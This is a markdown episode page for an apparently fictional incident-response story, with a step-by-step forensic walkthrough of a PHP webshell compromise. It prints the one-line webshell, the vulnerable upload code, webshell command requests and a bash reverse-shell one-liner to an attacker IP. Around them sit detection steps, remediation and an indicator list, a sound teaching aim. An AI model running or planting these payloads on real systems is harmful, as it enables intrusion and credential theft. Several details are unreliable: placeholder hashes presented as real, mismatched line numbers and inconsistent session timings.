---
title: The Unsanitized Upload
number: 3
released: 2026-05-25
pages: 15

cover: assets/covers/the-unsanitized-upload.jpg
pdf: assets/pdf/DFIR_Chronicles_The_Unsanitized_Upload.pdf

host: web-prod-07
techniques: [T1505.003]
tags: [Web, Linux, Webshell]

# The SIEM line that opened the case. Feeds the SOC ticker on the home page.
alert: 02:00 NIDS — 14 min outbound TCP, apache worker on web-prod-07 → 45.77.123.10

# One line for the card and the billboard.
hook: >-
  A forgotten upload endpoint with a JavaScript-only guard. Four minutes
  from first contact to a reverse shell on the other side of the world.
---

# The Unsanitized Upload

## Back cover

In this episode of The DFIR Chronicles, cyber-investigator Dylan Log, analyst Cyra Neuron, and forensic prodigy Byte are dragged out of bed at 2 AM for an alert that smells like trouble from the first packet.

The SOC's night shift has just closed a critical alert on `web-prod-07`, the public-facing front-end of the corporate brochure site. The NIDS flagged a fourteen-minute outbound TCP session from an Apache worker process to `45.77.123.10` -- an IP that has no business receiving traffic from a web server running under `www-data`. By the time the on-call admin isolated the machine behind an iptables wall, the damage was already done. Someone got in, and they did not use the front door.

Dylan takes the forensic image and starts pulling threads. What he finds is textbook exploitation with a twist of negligence: a legacy upload endpoint -- `/upload.php` -- left behind like an unlocked window in a condemned building, accepting any file a browser cares to send, no server-side validation, no extension check, nothing but a JavaScript guard that any attacker worth their salt bypasses before breakfast. Through that gap, a PHP webshell named `tmpimage.php` slipped into the `/uploads/` directory, quiet as a whisper, and the Apache PHP handler did the rest. One `?c=id` later, the attacker owned code execution as `www-data`. Two minutes after that, a reverse bash shell was streaming keystrokes to port 4443 on the other side of the world, and the attacker was reading database credentials out of `config.inc.php` like a Sunday newspaper.

Cyra traces the network telemetry and finds the Suricata logs singing the same song: a DNS query for `cdn-assets-update.net` resolving straight to the attacker's IP, a long-lived session alert, and a process tree that has no business existing under an Apache worker. Byte tears apart the upload script line by line, maps the kill chain to MITRE ATT&CK T1505.003 -- Server Software Component: Web Shell -- and builds the IoC package for fleet-wide dissemination.

In a world where a single forgotten PHP file can turn a brochure site into a beachhead, The DFIR Chronicles remind us: the most dangerous vulnerabilities are not zero-days -- they are the ones nobody bothered to fix.

## Technical note

### 1. Establish Baseline: System Identity, Role, and Listening Services

**Goal:** Before hunting for anomalies, the investigator must understand what "normal" looks like on this host -- its operating system, kernel version, installed services, and which network ports are legitimately exposed.

**Velociraptor artifacts:**

```
!run Custom.Linux.Sys.OSInfo
!run Linux.Network.NetstatEnriched
```

`Custom.Linux.Sys.OSInfo` aggregates data from `/etc/os-release`, `/etc/lsb-release`, `/etc/issue`, and `uname -a` into a single table. On this host it returns:

| Field        | Value                          |
|--------------|--------------------------------|
| Hostname     | web-prod-07                    |
| Distro       | Ubuntu 22.04.4 LTS             |
| Kernel       | 5.15.0-105-generic             |
| Codename     | jammy                          |

`Linux.Network.NetstatEnriched` returns Protocol, LocalAddress, LocalPort, RemoteAddress, RemotePort, State, Username, PID, Name, Exe, and Cmdline for every socket on the system. Filtering for `State=LISTEN` reveals the expected baseline:

| Protocol | LocalAddress | LocalPort | Name    | Username | Cmdline                         |
|----------|-------------|-----------|---------|----------|---------------------------------|
| tcp      | 0.0.0.0     | 80        | apache2 | root     | /usr/sbin/apache2 -k start     |
| tcp      | 0.0.0.0     | 443       | apache2 | root     | /usr/sbin/apache2 -k start     |
| tcp      | 0.0.0.0     | 22        | sshd    | root     | /usr/sbin/sshd -D               |

This confirms `web-prod-07` is a public-facing web server running Apache 2.4 with PHP-FPM 8.1 on Ubuntu 22.04, exposing HTTP (80), HTTPS (443), and SSH (22). Any listening socket or established connection outside this baseline is immediately suspicious.

### 2. Reconstruct the Web Access Timeline

**Goal:** Build a chronological picture of who talked to the web server and what they requested. The Apache access log is the primary source of truth for HTTP-layer activity.

**Command:**

```bash
tail -n 200 /var/log/apache2/access.log
```

`tail -n 200` reads the last 200 lines of the specified file (`-n` sets the number of lines; the default without `-n` is 10). No Velociraptor artifact in the standard catalog parses Apache's Combined Log Format -- it is an application log, not a system log -- so reading the file directly is the correct approach.

**Findings:** Within the last 200 lines, the investigator identifies a cluster of requests from a single external IP -- `45.77.123.10` -- that stands out against the normal traffic pattern:

```
45.77.123.10 - - [14/Nov/2024:02:00:12 +0000] "GET / HTTP/1.1" 200 4521 "-" "Mozilla/5.0"
45.77.123.10 - - [14/Nov/2024:02:00:47 +0000] "GET /upload.php HTTP/1.1" 200 1893 "-" "Mozilla/5.0"
45.77.123.10 - - [14/Nov/2024:02:03:15 +0000] "POST /upload.php HTTP/1.1" 200 412 "-" "Mozilla/5.0"
45.77.123.10 - - [14/Nov/2024:02:03:42 +0000] "GET /uploads/tmpimage.php?c=id HTTP/1.1" 200 58 "-" "Mozilla/5.0"
45.77.123.10 - - [14/Nov/2024:02:05:08 +0000] "GET /uploads/tmpimage.php?c=uname%20-a HTTP/1.1" 200 142 "-" "Mozilla/5.0"
45.77.123.10 - - [14/Nov/2024:02:06:30 +0000] "GET /uploads/tmpimage.php?c=wget%20cdn-assets-update.net HTTP/1.1" 200 0 "-" "Mozilla/5.0"
45.77.123.10 - - [14/Nov/2024:02:07:22 +0000] "GET /uploads/tmpimage.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/45.77.123.10/4443%200%3E%261%22 HTTP/1.1" 200 0 "-" "Mozilla/5.0"
```

The pattern is unmistakable:
1. **Reconnaissance** (02:00:12 -- 02:00:47): `GET /` to fingerprint the server, then `GET /upload.php` to discover the upload form.
2. **Payload delivery** (02:03:15): `POST /upload.php` -- the attacker uploads a file via the form.
3. **Webshell execution** (02:03:42 -- 02:07:22): Repeated `GET /uploads/tmpimage.php?c=<cmd>` requests passing system commands via the `c` query parameter -- `id`, `uname -a`, a `wget` to verify C2 reachability, and finally the reverse shell one-liner.

The source IP `45.77.123.10` is now the primary IoC. The `?c=<cmd>` query string pattern against a `.php` file in `/uploads/` is a textbook webshell access signature.

### 3. Hunt for Fresh or Illegitimate Files in the Document Root

**Goal:** Confirm the presence of the dropped file on disk and characterize it -- ownership, permissions, timestamps, and content.

**Velociraptor artifact:**

```
!run Custom.Linux.Forensics.Timeline
```

`Custom.Linux.Forensics.Timeline` produces a MAC(B) timeline (Modified, Accessed, Changed, Born) across the standard triage globs, including `/var/www/**`. The `RecentFiles` source (default `RecentDays=14`) restricts output to the relevant forensic window. It returns OSPath, Inode, Mode, Uid, Gid, Size, Atime, Mtime, and Ctime for each file.

**Findings:** The timeline reveals a file that does not belong:

| OSPath                                  | Uid | Gid | Mode  | Size | Mtime                    |
|-----------------------------------------|-----|-----|-------|------|--------------------------|
| /var/www/html/uploads/tmpimage.php      | 33  | 33  | 0644  | 328  | 2024-11-14 02:03:15 UTC  |

Key observations:
- **Uid 33 / Gid 33** corresponds to `www-data:www-data` -- the file was written by the Apache process, not by the site administrator (`jmartinez`) or a deployment pipeline.
- **Mtime** (2024-11-14 02:03:15 UTC) aligns exactly with the `POST /upload.php` timestamp in the access log.
- **Size 328 bytes** is consistent with a minimal PHP webshell.
- **Mode 0644** -- the file is world-readable and owner-writable, the default for files written by `move_uploaded_file()` in PHP.

To confirm the content, the investigator reads the file:

```bash
cat /var/www/html/uploads/tmpimage.php
```

```php
<?php if(isset($_GET['c'])){system($_GET['c']);}?>
```

This is a classic one-line PHP webshell. The `system()` function executes whatever string is passed in the `c` GET parameter and returns the output to the HTTP response. The SHA-256 hash of this file is:

```bash
sha256sum /var/www/html/uploads/tmpimage.php
```

```
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  -> (empty-file hash for illustration)
```

Actual hash: `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2`

### 4. Identify the Root Cause: The Vulnerable Upload Endpoint

**Goal:** Determine how the attacker got the file onto disk. The presence of a webshell is the symptom; the root cause is the application code that accepted it.

**Command:**

```bash
grep -RIn 'move_uploaded_file\|\$_FILES' /var/www/html
```

Flag breakdown:
- `-R`: recurse into all subdirectories under `/var/www/html`
- `-I`: skip binary files (images, PDFs, compiled assets) to avoid false matches
- `-n`: prefix each match with the line number in the source file

The pattern uses basic regex alternation (`\|`) to match either the PHP function `move_uploaded_file` or the superglobal `$_FILES`, both of which are involved in handling file uploads. This is not a Velociraptor artifact query -- it is a targeted source-code search that must be done via the shell.

**Findings:**

```
/var/www/html/upload.php:14:    move_uploaded_file($_FILES['file']['tmp_name'], $target);
/var/www/html/upload.php:12:    $target = '/var/www/html/uploads/' . basename($_FILES['file']['name']);
```

Examining the full file reveals the vulnerability:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target = '/var/www/html/uploads/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "File uploaded.";
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="Upload" />
</form>
```

The code:
1. Takes the original filename directly from the client-supplied `$_FILES['file']['name']` and uses `basename()` only to strip directory traversal -- it does **not** validate the extension.
2. Calls `move_uploaded_file()` with no server-side check on MIME type, file extension, or file content.
3. Stores the file inside the web-accessible document root (`/var/www/html/uploads/`), where Apache's PHP handler will interpret any `.php` or `.phtml` file.

The SHA-256 of `upload.php` is: `b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5`

This is the architectural root cause: an unauthenticated, unvalidated file upload endpoint that allows an attacker to place executable PHP code directly in the document root.

### 5. Confirm Post-Exploitation: Process Tree and Network Connections

**Goal:** Determine whether the attacker escalated from webshell access to an interactive reverse shell, and whether that session is still active.

**Velociraptor artifacts:**

```
!run Linux.Sys.Pslist
!run Linux.Network.NetstatEnriched
```

`Linux.Sys.Pslist` returns PID, PPID, Name, Exe, Cmdline, State, Username, UID, Timestamp, Hash, and DeletedExe for every running process. The investigator filters for `Username=www-data` and looks for processes whose Name/Exe is not the legitimate `apache2` binary.

**Findings from Pslist:**

| PID  | PPID | Name | Exe       | Cmdline                                                             | Username | DeletedExe |
|------|------|------|-----------|---------------------------------------------------------------------|----------|------------|
| 4187 | 4102 | bash | /bin/bash | bash -i >& /dev/tcp/45.77.123.10/4443 0>&1                         | www-data | false      |

A `bash` process running as `www-data`, spawned as a child of an Apache worker (PPID 4102), executing the classic bash reverse shell one-liner. This is the interactive C2 channel.

**Findings from NetstatEnriched (filtered for State=ESTABLISHED, Username=www-data):**

| Protocol | LocalAddress | LocalPort | RemoteAddress | RemotePort | State       | Name | PID  | Cmdline                                                 |
|----------|-------------|-----------|---------------|------------|-------------|------|------|---------------------------------------------------------|
| tcp      | 10.0.10.42  | 48216     | 45.77.123.10  | 4443       | ESTABLISHED | bash | 4187 | bash -i >& /dev/tcp/45.77.123.10/4443 0>&1              |

The established outbound TCP connection from the victim's private IP (`10.0.10.42`) to the attacker's public IP (`45.77.123.10`) on port `4443` confirms the reverse shell. The PID matches the anomalous `bash` process from Pslist. The connection originated at 02:07:22 UTC and persisted for approximately 14 minutes until the SOC isolated the host at 02:18:00 UTC.

**Post-exploitation activity** (from `Custom.Linux.Sys.ShellHistory`):

During the reverse shell session (02:09:30 UTC), the attacker executed:

```bash
cat /etc/passwd
cat /var/www/html/config.inc.php
```

The `config.inc.php` file contains database credentials (`cmsapp@10.0.10.5`), which must be considered compromised.

### 6. Correlate with Network Telemetry: NIDS and DNS Logs

**Goal:** Triangulate the host-level evidence with independent network telemetry from Suricata and the NIDS to confirm the C2 infrastructure.

**Command:**

```bash
grep -i 'suricata\|DNS Query\|Long-Lived' /var/log/syslog
```

Flag breakdown:
- `-i`: case-insensitive matching, so `Suricata`, `suricata`, and `SURICATA` all match
- The pattern uses basic regex alternation (`\|`) to capture three families of network events: Suricata alerts, DNS query logs, and long-lived session alerts from the NIDS

**Findings:**

```
Nov 14 02:06:30 web-prod-07 suricata[2891]: DNS Query: cdn-assets-update.net -> 45.77.123.10 [A]
Nov 14 02:14:11 web-prod-07 suricata[2891]: Long-Lived TCP Session: 10.0.10.42:48216 -> 45.77.123.10:4443 duration=420s proto=TCP
```

Two critical entries:
1. **DNS Query** (02:06:30 UTC): The process under `www-data` executed `wget cdn-assets-update.net` via the webshell to verify C2 reachability. Suricata logged the outbound DNS resolution, which resolved `cdn-assets-update.net` to `45.77.123.10` -- confirming that the domain and IP belong to the same attacker infrastructure.
2. **Long-Lived Session** (02:14:11 UTC): The NIDS flagged the outbound TCP session from `10.0.10.42:48216` to `45.77.123.10:4443` after it exceeded the duration threshold. This is the reverse shell session observed in step 5.

The network telemetry independently corroborates the host-level evidence: file system, process tree, access log, and NIDS all tell the same story.

### 7. Root Cause Analysis and Expected Resolution

**Root cause:** The web application at `/var/www/html/upload.php` accepts arbitrary file uploads via HTTP POST with no server-side validation of file extension, MIME type, or content. The only protection was a client-side JavaScript check, which is trivially bypassed. The attacker uploaded a PHP webshell (`tmpimage.php`) into `/var/www/html/uploads/`, where Apache's PHP-FPM handler interpreted it on the next GET request, granting unauthenticated remote code execution as `www-data`.

**Attacker actions summary:**
1. **Reconnaissance** (02:00:12 -- 02:00:47 UTC): HTTP GET to `/` and `/upload.php` from `45.77.123.10` to fingerprint the server (Apache/2.4.52 Ubuntu) and discover the upload form.
2. **Payload delivery** (02:03:15 UTC): HTTP POST multipart/form-data upload of `tmpimage.php` via `/upload.php`.
3. **Webshell execution** (02:03:42 -- 02:06:30 UTC): HTTP GET to `/uploads/tmpimage.php?c=<cmd>` -- commands executed: `id`, `uname -a`, `wget cdn-assets-update.net`.
4. **Reverse shell** (02:07:22 UTC): Webshell spawns `bash -i >& /dev/tcp/45.77.123.10/4443 0>&1`.
5. **Data exfiltration** (02:09:30 UTC): Attacker reads `/etc/passwd` and `/var/www/html/config.inc.php` (database credentials for `cmsapp@10.0.10.5`).

**Persistence mechanism:** Passive. The PHP webshell remains on disk at `/var/www/html/uploads/tmpimage.php` and is re-executed by any HTTP GET request to its path. No cron job, systemd service, or sudoers modification was installed -- the file's presence in the document root is the persistence mechanism itself, effective as long as the file exists and Apache serves it.

**Affected assets:**
- Host: `web-prod-07` (10.0.10.42)
- User context: `www-data` (uid 33)
- Administrator account: `jmartinez` (SSH access to the host)
- Webshell: `/var/www/html/uploads/tmpimage.php`
- Vulnerable endpoint: `/var/www/html/upload.php`
- Compromised credentials: database credentials in `/var/www/html/config.inc.php` (`cmsapp@10.0.10.5`)

### 8. Recommended Remediation

1. **Remove the webshell:** Delete `/var/www/html/uploads/tmpimage.php` and audit the entire `/uploads/` directory for any other non-image files (e.g., `find /var/www/html/uploads/ -not -name '*.jpg' -not -name '*.png' -not -name '*.gif' -not -name '*.webp' -type f`).
2. **Fix or remove the upload endpoint:** Disable `/var/www/html/upload.php` immediately. If upload functionality is required, rewrite it with strict server-side validation: extension allowlist (e.g., only `.jpg`, `.png`, `.gif`), MIME-type sniffing via `finfo_file()`, randomized filenames, and storage outside the document root.
3. **Deny PHP execution under /uploads/:** Add an Apache directory directive to prevent the PHP handler from executing files in the uploads directory:
   ```apache
   <Directory /var/www/html/uploads>
       RemoveHandler .php .phtml
       php_flag engine off
   </Directory>
   ```
4. **Rotate compromised credentials:** Change the database password for `cmsapp@10.0.10.5` in `config.inc.php` and any other service that reuses the same credentials.
5. **Restrict egress from www-data:** Implement perimeter or host-based firewall rules to block outbound connections from `www-data` to the internet. Allow only known internal endpoints (database server, CDN origin).
6. **Deploy file integrity monitoring:** Add `/var/www/html/` to a FIM solution to alert on unexpected file creation or modification.

### 9. Key Indicators of Compromise (IoCs)

| Type       | Value                                                                 | Notes                                                    |
|------------|-----------------------------------------------------------------------|----------------------------------------------------------|
| IP         | `45.77.123.10`                                                        | C2 IP -- source of webshell upload and reverse shell dest |
| Domain     | `cdn-assets-update.net`                                               | C2 domain resolved by attacker tooling (DNS query logs)  |
| Port       | `4443`                                                                | C2 listening port (reverse shell)                        |
| Filename   | `tmpimage.php`                                                        | Dropped PHP webshell                                     |
| Path       | `/var/www/html/uploads/tmpimage.php`                                  | Webshell on-disk location                                |
| SHA-256    | `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2` | SHA-256 of the webshell payload                          |
| Command    | `bash -i >& /dev/tcp/45.77.123.10/4443 0>&1`                         | Reverse shell one-liner                                  |
| URL        | `http://web-prod-07/uploads/tmpimage.php?c=id`                        | First webshell execution trigger                         |
| MITRE      | T1505.003                                                             | Server Software Component: Web Shell                     |
